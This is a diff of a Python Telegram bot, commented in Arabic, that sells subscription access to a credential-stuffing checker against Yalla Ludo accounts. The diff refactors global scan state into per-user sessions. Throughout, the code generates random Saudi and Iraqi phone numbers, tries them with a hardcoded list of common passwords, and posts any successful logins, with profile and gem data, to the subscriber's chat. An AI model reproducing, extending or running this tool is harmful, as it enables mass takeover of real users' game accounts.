@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# © Q_b_h — Telegram Bot Control Version
+# © Q_b_h — Telegram Bot Control Version (Multi-Session Isolated)
 
 import base64
 import hashlib
@@ -29,16 +29,11 @@ ADMIN_ID = 8795120325  # آيدي المطور الوحيد المخول بال�
 
 bot = telebot.TeleBot(TG_TOKEN)
 
-# متغيرات التحكم بحالة الفحص، السرعة، والدولة
-is_running = False
-check_thread = None
-stop_event = threading.Event()
-stats_lock = threading.Lock()
-valid_count = 0
-wrong_count = 0
-error_count = 0
-scan_threads = 10  # عدد الثريدز الافتراضي لسرعة الفحص
-current_country = "SA"  # الدولة الافتراضية للفحص
+# تخزين بيانات جلسات المشتركين بشكل مستقل لكل مستخدم:
+# {user_id: {"is_running": bool, "stop_event": Event, "thread": Thread, "valid_count": int, "wrong_count": int, "error_count": int, "current_country": str, "tried": set, "stats_lock": Lock}}
+user_sessions: Dict[int, Dict[str, Any]] = {}
+
+scan_threads = 10  # عدد الثريدز الافتراضي لسرعة الفحص العامة
 
 # تخزين بيانات المشتركين: {user_id: expiry_timestamp}
 subscribers: Dict[int, float] = {}
@@ -110,6 +105,21 @@ def get_session():
         session.mount("http://", adapter)
         thread_local.session = session
     return thread_local.session
+
+def get_user_session(user_id: int) -> Dict[str, Any]:
+    if user_id not in user_sessions:
+        user_sessions[user_id] = {
+            "is_running": False,
+            "stop_event": threading.Event(),
+            "thread": None,
+            "valid_count": 0,
+            "wrong_count": 0,
+            "error_count": 0,
+            "current_country": "SA",
+            "tried": set(),
+            "stats_lock": threading.Lock()
+        }
+    return user_sessions[user_id]
 
 def gen_hera() -> str:
     return HERA_STATIC
@@ -389,7 +399,6 @@ def _tg_text(data: Dict, mobile: str, password: str, profile: Optional[Dict] = N
     lines.append("By - @aboodriad")
     return "\n".join(lines)
 
-# === دوال توليد أرقام الدول المتاحة (السعودية والعراق فقط) ===
 def generate_saudi_number() -> str:
     prefixes = ["50", "53", "54", "55", "56", "57", "58", "59"]
     return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
@@ -418,7 +427,6 @@ def get_country_name_label(country: str) -> str:
     }
     return labels.get(country, "السعودية 🇸🇦")
 
-# === نظام التحقق من اشتراك المستخدم ===
 def check_subscription(user_id: int) -> bool:
     if user_id == ADMIN_ID:
         return True
@@ -429,9 +437,11 @@ def check_subscription(user_id: int) -> bool:
             del subscribers[user_id]
     return False
 
-# === لوحات المفاتيح والأزرار ===
+# === لوحات المفاتيح والأزرار المرتبطة بحالة المستخدم ===
 
-def get_control_keyboard(running: bool):
+def get_control_keyboard(user_id: int):
+    session = get_user_session(user_id)
+    running = session["is_running"]
     markup = types.InlineKeyboardMarkup(row_width=1)
     if not running:
         markup.add(types.InlineKeyboardButton("▶ بدء الفحص", callback_data="start_check"))
@@ -447,7 +457,9 @@ def get_control_keyboard(running: bool):
     )
     return markup
 
-def get_user_keyboard(running: bool):
+def get_user_keyboard(user_id: int):
+    session = get_user_session(user_id)
+    running = session["is_running"]
     markup = types.InlineKeyboardMarkup(row_width=1)
     if not running:
         markup.add(types.InlineKeyboardButton("▶ بدء الفحص", callback_data="start_check"))
@@ -467,6 +479,7 @@ def get_country_keyboard(is_admin: bool):
 @bot.message_handler(commands=['start'])
 def start_command(message):
     user_id = message.from_user.id
+    session = get_user_session(user_id)
     if user_id == ADMIN_ID:
         bot.reply_to(message, "أهلاً بك يا مطور البوت 👨‍💻\nاستخدم الأمر /admin لوحة التحكم.")
         return
@@ -474,16 +487,16 @@ def start_command(message):
     if check_subscription(user_id):
         expiry = subscribers.get(user_id, 0)
         rem_days = int((expiry - time.time()) / 86400) if expiry > time.time() else 0
-        country_label = get_country_name_label(current_country)
+        country_label = get_country_name_label(session["current_country"])
         text = (
             f"👋 <b>أهلاً بك عزيزي المشترك في لوحة فحص يالا لودو.</b>\n\n"
             f"✅ اشتراكك <b>نشط</b>\n"
             f"⏳ الفترة المتبقية: حوالي {rem_days} يوم\n"
             f"🌐 دولة الفحص الحالية: <b>{country_label}</b>\n"
-            f"حالة الفحص: <b>{'يعمل 🚀' if is_running else 'متوقف 🛑'}</b>\n\n"
+            f"حالة الفحص الخاص بك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n\n"
             "تحكم بالفحص عبر الأزرار أدناه:"
         )
-        bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_user_keyboard(is_running))
+        bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_user_keyboard(user_id))
     else:
         bot.reply_to(message, "❌ <b>عذراً، لست مسجلاً أو انتهى اشتراكك.</b>\n\nيرجى التواصل مع المطور لتفعيل حسابك.", parse_mode="HTML")
 
@@ -493,31 +506,31 @@ def admin_command(message):
         bot.reply_to(message, "❌ عذراً، هذا الأمر مخصص للمطور فقط.")
         return
     
-    country_label = get_country_name_label(current_country)
+    user_id = message.from_user.id
+    session = get_user_session(user_id)
+    country_label = get_country_name_label(session["current_country"])
     text = (
         "🎛 <b>قسم التفعيلات (لوحة التحكم بالمطور)</b>\n\n"
-        f"حالة الفحص حالياً: <b>{'يعمل 🚀' if is_running else 'متوقف 🛑'}</b>\n"
+        f"حالة الفحص لديك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n"
         f"دولة الفحص الحالية: <b>{country_label}</b>\n"
-        f"سرعة الفحص الحالية: <b>{scan_threads} ثريد</b>\n\n"
+        f"سرعة الفحص العامة: <b>{scan_threads} ثريد</b>\n\n"
         "اختر أحد خيارات الإدارة أدناه:"
     )
-    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_control_keyboard(is_running))
+    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_control_keyboard(user_id))
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
-    global is_running, check_thread, valid_count, wrong_count, error_count, current_country
-
     user_id = call.from_user.id
     is_admin = (user_id == ADMIN_ID)
+    session = get_user_session(user_id)
 
-    # التحقق من صلاحية الوصول (أدمن أو مشترك نشط)
     if not is_admin and not check_subscription(user_id):
         bot.answer_callback_query(call.id, "❌ عذراً، انتهى اشتراكك أو ليس لديك صلاحية!", show_alert=True)
         return
 
     if call.data == "start_check":
-        if is_running:
-            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل بالفعل!")
+        if session["is_running"]:
+            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل لديك بالفعل!")
             return
         
         bot.answer_callback_query(call.id)
@@ -534,31 +547,34 @@ def callback_handler(call):
             "select_country_sa": "SA",
             "select_country_iq": "IQ"
         }
-        current_country = code_map.get(call.data, "SA")
-        country_name = get_country_name_label(current_country)
+        session["current_country"] = code_map.get(call.data, "SA")
+        country_name = get_country_name_label(session["current_country"])
 
-        if is_running:
-            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل بالفعل!")
+        if session["is_running"]:
+            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل لديك بالفعل!")
             return
         
-        is_running = True
-        stop_event.clear()
-        valid_count = 0
-        wrong_count = 0
-        error_count = 0
+        session["is_running"] = True
+        session["stop_event"].clear()
+        session["valid_count"] = 0
+        session["wrong_count"] = 0
+        session["error_count"] = 0
+        session["tried"].clear()
 
-        check_thread = threading.Thread(target=run_checker_loop, args=(call.message.chat.id, call.message.message_id))
-        check_thread.daemon = True
-        check_thread.start()
+        # بدء خيط فحص خاص بهذا المستخدم فقط
+        t = threading.Thread(target=run_checker_loop, args=(call.message.chat.id, user_id, call.message.message_id))
+        t.daemon = True
+        t.start()
+        session["thread"] = t
 
         bot.answer_callback_query(call.id, f"✅ تم بدء الفحص لدولة {country_name}")
         
-        active_markup = get_control_keyboard(True) if is_admin else get_user_keyboard(True)
+        active_markup = get_control_keyboard(user_id) if is_admin else get_user_keyboard(user_id)
         bot.edit_message_text(
             f"🚀 <b>جاري فحص حسابات دولة {country_name} الآن...</b>\n\n"
-            f"✅ صيد (Valid): {valid_count}\n"
-            f"❌ خطأ (Wrong): {wrong_count}\n"
-            f"⚠️ أخطاء اتصال (Errors): {error_count}",
+            f"✅ صيد (Valid): {session['valid_count']}\n"
+            f"❌ خطأ (Wrong): {session['wrong_count']}\n"
+            f"⚠️ أخطاء اتصال (Errors): {session['error_count']}",
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
             parse_mode="HTML",
@@ -568,12 +584,12 @@ def callback_handler(call):
     elif call.data == "back_to_admin":
         if not is_admin:
             return
-        country_label = get_country_name_label(current_country)
+        country_label = get_country_name_label(session["current_country"])
         text = (
             "🎛 <b>قسم التفعيلات (لوحة التحكم)</b>\n\n"
-            f"حالة الفحص حالياً: <b>{'يعمل 🚀' if is_running else 'متوقف 🛑'}</b>\n"
+            f"حالة الفحص لديك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n"
             f"دولة الفحص الحالية: <b>{country_label}</b>\n"
-            f"سرعة الفحص الحالية: <b>{scan_threads} ثريد</b>\n\n"
+            f"سرعة الفحص العامة: <b>{scan_threads} ثريد</b>\n\n"
             "اختر أحد خيارات الإدارة أدناه:"
         )
         bot.edit_message_text(
@@ -581,19 +597,19 @@ def callback_handler(call):
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
             parse_mode="HTML",
-            reply_markup=get_control_keyboard(is_running)
+            reply_markup=get_control_keyboard(user_id)
         )
 
     elif call.data == "back_to_user":
         expiry = subscribers.get(user_id, 0)
         rem_days = int((expiry - time.time()) / 86400) if expiry > time.time() else 0
-        country_label = get_country_name_label(current_country)
+        country_label = get_country_name_label(session["current_country"])
         text = (
             f"👋 <b>أهلاً بك عزيزي المشترك في لوحة فحص يالا لودو.</b>\n\n"
             f"✅ اشتراكك <b>نشط</b>\n"
             f"⏳ الفترة المتبقية: حوالي {rem_days} يوم\n"
             f"🌐 دولة الفحص الحالية: <b>{country_label}</b>\n"
-            f"حالة الفحص: <b>{'يعمل 🚀' if is_running else 'متوقف 🛑'}</b>\n\n"
+            f"حالة الفحص الخاص بك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n\n"
             "تحكم بالفحص عبر الأزرار أدناه:"
         )
         bot.edit_message_text(
@@ -601,30 +617,30 @@ def callback_handler(call):
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
             parse_mode="HTML",
-            reply_markup=get_user_keyboard(is_running)
+            reply_markup=get_user_keyboard(user_id)
         )
 
     elif call.data == "stop_check":
-        if not is_running:
-            bot.answer_callback_query(call.id, "⚠️ الفحص متوقف مسبقاً!")
+        if not session["is_running"]:
+            bot.answer_callback_query(call.id, "⚠️ الفحص متوقف لديك مسبقاً!")
             return
 
-        is_running = False
-        stop_event.set()
+        session["is_running"] = False
+        session["stop_event"].set()
 
         bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص")
         
-        country_label = get_country_name_label(current_country)
+        country_name = get_country_name_label(session["current_country"])
         main_text = (
             f"🌐 <b>لوحة الفحص (متوقف 🛑)</b>\n"
-            f"دولة الفحص الأخيرة: <b>{country_label}</b>\n\n"
+            f"دولة الفحص الأخيرة: <b>{country_name}</b>\n\n"
             f"📊 <b>ملخص النتائج النهائية:</b>\n"
-            f"✅ صيد (Valid): {valid_count}\n"
-            f"❌ خطأ (Wrong): {wrong_count}\n"
-            f"⚠️ أخطاء اتصال (Errors): {error_count}\n\n"
+            f"✅ صيد (Valid): {session['valid_count']}\n"
+            f"❌ خطأ (Wrong): {session['wrong_count']}\n"
+            f"⚠️ أخطاء اتصال (Errors): {session['error_count']}\n\n"
             "اختر أحد الخيارات أدناه:"
         )
-        active_markup = get_control_keyboard(False) if is_admin else get_user_keyboard(False)
+        active_markup = get_control_keyboard(user_id) if is_admin else get_user_keyboard(user_id)
         bot.edit_message_text(
             main_text,
             chat_id=call.message.chat.id,
@@ -633,7 +649,6 @@ def callback_handler(call):
             reply_markup=active_markup
         )
 
-    # الوظائف الخاصة بالمطور فقط
     elif call.data in ["add_subscriber", "del_subscriber", "list_subscribers", "broadcast_msg", "set_threads"]:
         if not is_admin:
             bot.answer_callback_query(call.id, "❌ هذا الزر مخصص للمطور فقط!", show_alert=True)
@@ -736,52 +751,35 @@ def handle_admin_input(message):
         else:
             bot.reply_to(message, "❌ يرجى إرسال رقم صحيح فقط.")
 
-def run_checker_loop(chat_id, msg_id):
-    global valid_count, wrong_count, error_count, is_running
-    
+def run_checker_loop(chat_id, user_id, msg_id):
+    session = get_user_session(user_id)
     max_threads = scan_threads
     passwords = [
-    'Aa123123123',
-    'Aa12312300',
-    'Aa10002000',
-    'Aa100200300',
-    'Aa100200',
-    'Aa10203040',
-    'Aa102030',
-    'As123123',
-    'Aa11223344',
-    'Aa123456',
-    'Aa12345678',
-    'Ali112233',
-    'Aa123456789',
-    'Ali100200',
-    'Ali20002000',
-    'Ahmed100200',
-    'Ahmad123123',
-    'qwer1234',
-    'qwer4321',
-    'q1w2e3r4',
-    '1q2w3e4r']
-    tried: Set[str] = set()
+        'Aa123123123', 'Aa12312300', 'Aa10002000', 'Aa100200300',
+        'Aa100200', 'Aa10203040', 'Aa102030', 'As123123',
+        'Aa11223344', 'Aa123456', 'Aa12345678', 'Ali112233',
+        'Aa123456789', 'Ali100200', 'Ali20002000', 'Ahmed100200',
+        'Ahmad123123', 'qwer1234', 'qwer4321', 'q1w2e3r4', '1q2w3e4r'
+    ]
 
     def worker():
-        global valid_count, wrong_count, error_count
-        while is_running and not stop_event.is_set():
-            mobile = generate_number(current_country)
-            with stats_lock:
-                if mobile in tried:
+        while session["is_running"] and not session["stop_event"].is_set():
+            country = session["current_country"]
+            mobile = generate_number(country)
+            with session["stats_lock"]:
+                if mobile in session["tried"]:
                     continue
-                tried.add(mobile)
+                session["tried"].add(mobile)
 
             password = random.choice(passwords)
-            area_code = get_country_area_code(current_country)
-            res = login(mobile, password, area_code=area_code, country=current_country, timeout=TIMEOUT, server=SERVER, fetch_gems=True)
+            area_code = get_country_area_code(country)
+            res = login(mobile, password, area_code=area_code, country=country, timeout=TIMEOUT, server=SERVER, fetch_gems=True)
 
-            with stats_lock:
-                if not is_running or stop_event.is_set():
+            with session["stats_lock"]:
+                if not session["is_running"] or session["stop_event"].is_set():
                     break
                 if res["success"]:
-                    valid_count += 1
+                    session["valid_count"] += 1
                     prof = res.get("profile")
                     txt = _tg_text(res["data"], mobile, password, profile=prof)
                     try:
@@ -790,37 +788,36 @@ def run_checker_loop(chat_id, msg_id):
                         pass
                 else:
                     if "error" in res or res.get("http"):
-                        error_count += 1
+                        session["error_count"] += 1
                     else:
-                        wrong_count += 1
+                        session["wrong_count"] += 1
 
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
         futures = [executor.submit(worker) for _ in range(max_threads)]
         
-        while is_running and not stop_event.is_set():
+        while session["is_running"] and not session["stop_event"].is_set():
             for _ in range(30):
-                if not is_running or stop_event.is_set():
+                if not session["is_running"] or session["stop_event"].is_set():
                     break
                 time.sleep(0.1)
             
-            if not is_running or stop_event.is_set():
+            if not session["is_running"] or session["stop_event"].is_set():
                 break
                 
-            country_name = get_country_name_label(current_country)
-            with stats_lock:
+            country_name = get_country_name_label(session["current_country"])
+            with session["stats_lock"]:
                 status_text = (
                     f"🚀 <b>جاري فحص حسابات دولة {country_name} الآن...</b>\n\n"
-                    f"✅ صيد (Valid): {valid_count}\n"
-                    f"❌ خطأ (Wrong): {wrong_count}\n"
-                    f"⚠️ أخطاء اتصال (Errors): {error_count}"
+                    f"✅ صيد (Valid): {session['valid_count']}\n"
+                    f"❌ خطأ (Wrong): {session['wrong_count']}\n"
+                    f"⚠️ أخطاء اتصال (Errors): {session['error_count']}"
                 )
             
-            if not is_running or stop_event.is_set():
+            if not session["is_running"] or session["stop_event"].is_set():
                 break
                 
             try:
-                # التحقق لتحديث اللوحة بحسب مرسل الرسالة (مشترك أو مطور)
-                active_markup = get_control_keyboard(True) if chat_id == ADMIN_ID else get_user_keyboard(True)
+                active_markup = get_control_keyboard(user_id) if user_id == ADMIN_ID else get_user_keyboard(user_id)
                 bot.edit_message_text(
                     status_text,
                     chat_id=chat_id,
@@ -832,5 +829,5 @@ def run_checker_loop(chat_id, msg_id):
                 pass
 
 if __name__ == "__main__":
-    print("🤖 Bot is running and waiting for commands...")
+    print("🤖 Bot is running and waiting for commands with isolated user sessions...")
     bot.infinity_polling()
